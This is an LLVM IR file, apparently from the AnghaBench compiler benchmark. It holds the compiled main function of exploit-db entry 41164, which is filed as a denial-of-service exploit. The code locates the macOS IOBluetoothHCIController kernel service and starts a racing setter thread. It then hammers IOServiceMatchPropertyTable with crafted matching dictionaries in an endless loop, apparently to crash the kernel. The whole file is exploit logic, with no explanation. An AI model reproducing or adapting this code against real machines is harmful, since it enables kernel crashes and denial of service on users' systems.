; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_41164.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_41164.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@kIOMasterPortDefault = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [25 x i8] c"IOBluetoothHCIController\00", align 1
@service = common dso_local global i64 0, align 8
@IO_OBJECT_NULL = common dso_local global i64 0, align 8
@.str.1 = private unnamed_addr constant [24 x i8] c"unable to find service\0A\00", align 1
@.str.2 = private unnamed_addr constant [17 x i8] c"got service: %x\0A\00", align 1
@setter = common dso_local global i32 0, align 4
@kCFAllocatorDefault = common dso_local global i32 0, align 4
@kCFTypeDictionaryKeyCallBacks = common dso_local global i32 0, align 4
@kCFTypeDictionaryValueCallBacks = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [4 x i8] c"key\00", align 1
@.str.4 = private unnamed_addr constant [6 x i8] c"value\00", align 1
@.str.5 = private unnamed_addr constant [16 x i8] c"IOProviderClass\00", align 1
@.str.6 = private unnamed_addr constant [10 x i8] c"IOService\00", align 1
@.str.7 = private unnamed_addr constant [16 x i8] c"IOResourceMatch\00", align 1
@.str.8 = private unnamed_addr constant [6 x i8] c"IOBSD\00", align 1
@.str.9 = private unnamed_addr constant [14 x i8] c"IOParentMatch\00", align 1
@KERN_SUCCESS = common dso_local global i32 0, align 4
@.str.10 = private unnamed_addr constant [12 x i8] c"no matches\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %7 = load i32, i32* @kIOMasterPortDefault, align 4
  %8 = call i32 @IOServiceMatching(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str, i64 0, i64 0))
  %9 = call i64 @IOServiceGetMatchingService(i32 %7, i32 %8)
  store i64 %9, i64* @service, align 8
  %10 = load i64, i64* @service, align 8
  %11 = load i64, i64* @IO_OBJECT_NULL, align 8
  %12 = icmp eq i64 %10, %11
  br i1 %12, label %13, label %15

13:                                               ; preds = %0
  %14 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.1, i64 0, i64 0))
  ret i32 0

15:                                               ; preds = %0
  %16 = load i64, i64* @service, align 8
  %17 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.2, i64 0, i64 0), i64 %16)
  %18 = load i32, i32* @setter, align 4
  %19 = call i32 @pthread_create(i32* %3, i32* null, i32 %18, i32* null)
  %20 = load i32, i32* @kCFAllocatorDefault, align 4
  %21 = call i32 @CFDictionaryCreateMutable(i32 %20, i32 0, i32* @kCFTypeDictionaryKeyCallBacks, i32* @kCFTypeDictionaryValueCallBacks)
  store i32 %21, i32* %4, align 4
  %22 = load i32, i32* %4, align 4
  %23 = call i32 @CFSTR(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.3, i64 0, i64 0))
  %24 = call i32 @CFSTR(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i64 0, i64 0))
  %25 = call i32 @CFDictionarySetValue(i32 %22, i32 %23, i32 %24)
  %26 = load i32, i32* @kCFAllocatorDefault, align 4
  %27 = call i32 @CFDictionaryCreateMutable(i32 %26, i32 0, i32* @kCFTypeDictionaryKeyCallBacks, i32* @kCFTypeDictionaryValueCallBacks)
  store i32 %27, i32* %5, align 4
  %28 = load i32, i32* %5, align 4
  %29 = call i32 @CFSTR(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.5, i64 0, i64 0))
  %30 = call i32 @CFSTR(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.6, i64 0, i64 0))
  %31 = call i32 @CFDictionarySetValue(i32 %28, i32 %29, i32 %30)
  %32 = load i32, i32* %5, align 4
  %33 = call i32 @CFSTR(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.7, i64 0, i64 0))
  %34 = call i32 @CFSTR(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.8, i64 0, i64 0))
  %35 = call i32 @CFDictionarySetValue(i32 %32, i32 %33, i32 %34)
  %36 = load i32, i32* %5, align 4
  %37 = call i32 @CFSTR(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.9, i64 0, i64 0))
  %38 = load i32, i32* %4, align 4
  %39 = call i32 @CFDictionarySetValue(i32 %36, i32 %37, i32 %38)
  br label %40

40:                                               ; preds = %15, %49
  store i32 0, i32* %6, align 4
  %41 = load i64, i64* @service, align 8
  %42 = load i32, i32* %5, align 4
  %43 = call i32 @IOServiceMatchPropertyTable(i64 %41, i32 %42, i32* %6)
  store i32 %43, i32* %2, align 4
  %44 = load i32, i32* %2, align 4
  %45 = load i32, i32* @KERN_SUCCESS, align 4
  %46 = icmp ne i32 %44, %45
  br i1 %46, label %47, label %49

47:                                               ; preds = %40
  %48 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.10, i64 0, i64 0))
  br label %49

49:                                               ; preds = %47, %40
  br label %40
}

declare dso_local i64 @IOServiceGetMatchingService(i32, i32) #1

declare dso_local i32 @IOServiceMatching(i8*) #1

declare dso_local i32 @printf(i8*, ...) #1

declare !callback !2 dso_local i32 @pthread_create(i32*, i32*, i32, i32*) #1

declare dso_local i32 @CFDictionaryCreateMutable(i32, i32, i32*, i32*) #1

declare dso_local i32 @CFDictionarySetValue(i32, i32, i32) #1

declare dso_local i32 @CFSTR(i8*) #1

declare dso_local i32 @IOServiceMatchPropertyTable(i64, i32, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
!2 = !{!3}
!3 = !{i64 2, i64 3, i1 false}
